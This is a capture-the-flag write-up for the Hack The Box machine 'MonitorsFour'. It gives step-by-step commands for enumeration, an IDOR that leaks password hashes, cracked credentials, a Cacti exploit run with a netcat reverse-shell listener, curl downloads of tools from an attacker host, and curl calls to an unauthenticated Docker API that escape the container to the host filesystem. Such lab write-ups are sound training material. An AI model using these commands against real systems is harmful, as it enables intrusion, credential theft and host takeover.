# MonitorFour-Write-UP : Hack The Box

<img width="850" height="628" alt="image" src="https://github.com/user-attachments/assets/6d04c533-1ce2-48f9-a153-ec5cf05f4244" /> 

# Description 

# Overview
 MonitorsFour is an Easy difficulty Windows machine on Hack The Box that focuses on:

Web Enumeration
IDOR Vulnerability Exploitation
Credential Harvesting
Cacti Exploitation
Docker Container Escape
Privilege Escalation

The machine teaches how multiple small vulnerabilities can be chained together to achieve full system compromise.


USER.TXT 


• Enumeration : Scan Port using nmap 
	
    CMD : nmap -sS <IP>
<img width="616" height="213" alt="image" src="https://github.com/user-attachments/assets/906faba9-29ad-4ba9-96dc-ee591c06b242" />

Http - 80 
WinRM - 5985
	
 Explore Webpage : But not Open because it is Resolve to = monitorsfour.htb
	
We can set IP and Domain name in /etc/hosts File.
<img width="571" height="303" alt="image" src="https://github.com/user-attachments/assets/6dd6a80d-dd1a-417b-b790-8b6cc0ac8b14" />

Explore Again Http Web pages : In this Web Page Found Login Page


<img width="1547" height="799" alt="image" src="https://github.com/user-attachments/assets/7358059b-d465-4982-a647-036e5c9faa3a" />

Identify Subdomains : Using TOOL = FFUF
	
    CMD :  ffuf -u http://monitorsfour.htb -H 'Host: FUZZ.monitorsfour.htb' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 50 -fs 138


<img width="1337" height="488" alt="image" src="https://github.com/user-attachments/assets/bcaed13a-899f-4184-b837-b9c7a226b582" />

SUBDOMAIN : cacti 
	
• Explore This Subdomain and Add In /etc/hosts file :



  <img width="1342" height="786" alt="image" src="https://github.com/user-attachments/assets/301ffdab-800c-4a90-920e-fc481fc4bf14" />



	
Founded This Login Page and this Login page Version
	
Version : 1.2.28
	
Directory Busting : Using Tool = Gobuster 
	
    CMD :  gobuster dir -u http://monitorsfour.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt   -t 20 


<img width="1283" height="407" alt="image" src="https://github.com/user-attachments/assets/8ae23aaf-3f7a-4bc5-9583-f8dacc564ae6" />




See these Pages on = monitorsfour.htb URL
	
• Check User Page :  

<img width="1093" height="421" alt="image" src="https://github.com/user-attachments/assets/34eb6623-5cb5-4ab1-8799-01ad3f40f74a" />



  
Missing Parameter Error 
	
Try to ADD Token Parameter 
	
/user?token=0

<img width="1753" height="487" alt="image" src="https://github.com/user-attachments/assets/2348e2ca-a1e4-4d5d-a827-cfb8cbcbb051" />

  

	
Found a users Credential - Name , ID , HASH, Email, Role , etc. Details
	
Analys Super User Role : Copy Password Hash 
	
• Crack Password in Some Websites : crack station , Hashes.com 
	
Hashes.com 


  <img width="949" height="247" alt="image" src="https://github.com/user-attachments/assets/0f778f92-5a90-4492-b72c-48eede7edbfe" />


	
Username = Admin 
Password = Wonderful1
  
• Login with monitorsfour.htb/login page :  

<img width="1469" height="763" alt="image" src="https://github.com/user-attachments/assets/e3117a44-d6d0-4442-9ee3-bb4ed7e964e7" />

  

	
Login Success Ful
	
 Login With cacti.monitorsfour.htb/cacti : 
	
Username : marcus
	Password : wonderful1
	
<img width="1825" height="685" alt="image" src="https://github.com/user-attachments/assets/902078d9-4423-42f0-9e6a-35544813a35c" />

	

	
Login Success Ful
	
	
	
• Find Version Exploit : on Browsers 
	
Version : 1.2.28


  <img width="1732" height="867" alt="image" src="https://github.com/user-attachments/assets/02ed1618-8b24-4cd3-927e-3255f58c7830" />


	
We Found This Exploit - Cybergeek
	
- CVE-2025-24367
	
	- Download Code - Exploit.py
	- Make it Executable 
	- Run with this Command : 
	
ATTACKER
		
		CMD : python3 exploit.py -u marcus -p wonderful1 -i <ATTACKER-IP> -l 1234 -url http://cacti.monitorsfour.htb
	
- Before this Command Start Listening on Netcap
	
  ATTACKER
    
   		 CMD : nc -nlvp 1234
	
<img width="474" height="405" alt="image" src="https://github.com/user-attachments/assets/f1559850-a13b-4445-b1b8-d43ca9dfa7d2" />


	
ACCESS Successful : With User.txt
	
	
	
USER.TXT---------------------------------------------------------------FLAG{}-----------------------------------------------








# ROOT.TXT


• Start Privilege Escalation : 
	
[This is a Window machine But Access Get Linux machine ]
	
• Check it is Docker Container or not :
	
<img width="565" height="147" alt="image" src="https://github.com/user-attachments/assets/0b76ad65-2d98-4b88-a873-93721125b7ea" />

	
Yes - machine have .docker file - it is Container 
	
• Check kernal Version in this Machine : 
	
	CMD : uname -a 

<img width="1032" height="108" alt="image" src="https://github.com/user-attachments/assets/e4dec9f1-9a02-42ab-94d0-3a7b1bdb3f6c" />


VERSION - 6.6.87.2
	
• Check IP  :  
	
	CMD : ip  a 

<img width="993" height="253" alt="image" src="https://github.com/user-attachments/assets/35afae14-1dd4-4111-8409-9b88944bffbc" />

	
This is a Container IP
	
	
• Transfer Nmap Binary in this machine : in /var/www/html
	
BINARY URL : DOWNLOAD
	
ATTACKER 

	CMD : python3 -m http.server 80
	
Victim 

	CMD : curl http://ATTACKER-IP/nmap -o nmap 
	
Make it executable 
	
	CMD : ./nmap -sn -PS 172.18.0.0

<img width="938" height="323" alt="image" src="https://github.com/user-attachments/assets/f461245f-68eb-4fce-82fc-aa878d8e640a" />


3 host UP
	
• Transfer Fscan Binary in this Machine : in var/www/html
	
BINARY URL : DOWNLOAD 
	
	ATTACKER 
	CMD : python3 -m http.server 80
	
	Victim 
	CMD : curl http://ATTACKER-IP/fscan -o fscan 
	
Make it executable 
	
	CMD : ./fscan -h 172.18.0.1 -p 1-65535
	
	
• Scan All device in this Network : Using this trick 
	
WEBSITE = here 
	
Docker Host domain name for API = Host.docker.internal
	
Try port of 2375 with using curl command 
	
	CMD : curl -v http://host.docker.internal:2375/version 
	
<img width="1079" height="316" alt="image" src="https://github.com/user-attachments/assets/dd2d1263-b884-4d66-b2bb-02070e77731f" />

	
This is Resolve Another IP which is Resolve in this network IP 
	
• Scan in this Subnet - 192.168.65.0/24
	
	CMD : ./nmap -sn 192.168.65.0/24 
<img width="653" height="336" alt="image" src="https://github.com/user-attachments/assets/573f833f-3164-4e6d-aca1-940053ea2426" />

	
	These Four IP resolve 
	192.168.65.3
	192.168.65.6
	192.168.65.7
	192.168.65.129
	
• Check 2375 Port in these Ips : Using this fscan 
	
	CMD : ./fscan -h 192.168.65.7 -p 2375
	
<img width="635" height="233" alt="image" src="https://github.com/user-attachments/assets/26586801-a174-47eb-ba9f-d16e04b41019" />

	
Port is Open in this IP
	
• Check version : Using CURL Command 
	
	CMD : curl http://192.168.65.7:2375/version
	
	
Docker Engine version : 28.3.2
	
• This version Vulnerability Search on Browser : 
	Vulnerability : CVE-2025-9074  (POC)
	
<img width="1371" height="936" alt="image" src="https://github.com/user-attachments/assets/9d7cc70c-60d3-4727-99ed-d577f2cb3cf1" />

	
This Steps follow to exploit It PoC Step 
	

NOTE : This Technique Work = Link window Machine File System To container Linux Machine .

1. Create PoC file Because : Victim machine not have PYTHON Permissions 
	
ATTACKER 
	
		CMD : nano container.json

<img width="1498" height="417" alt="image" src="https://github.com/user-attachments/assets/d6594c01-54b9-4c33-8c6f-29b6bcba7a52" />

	
Use this Command for Read Root.txt : 
	
{ You this Code customize }
	
•  Transfer this file to Victim machine : 
	
ATTACKER 

	CMD : python3 -m http.server
	
Victim

	CMD : curl http://ATTACKER-IP/container.json -o container.json

• Ask to container I have json file to run 
	
	CMD : curl -X POST -H "Content-Type: application/json" -d @/var/www/html/container.json  http://192.168.65.7:2375/containers/create?name=pwned
	
	
	
Docker Connect window File System to Kali linux Container 
	
• Start this :
	
	CMD : curl -X POST http://192.168.65.7:2375/containers/7d99df11ee0f/start 
	
ID Using Uniquely And Full name As Your wish 
	
• Check Logs :
	
	CMD :  curl http://192.168.65.7:2375/containers/7d99df11ee0f/logs?stdout=true

<img width="1155" height="139" alt="image" src="https://github.com/user-attachments/assets/c50f2f80-4afe-4a66-a423-28998e537ade" />

	
ACCESS ROOT.TXT Content
	
	
ROOT.TXT-------------------------------------------------------------------------FLAG{}-------------------------------------
	
	
	
	
	
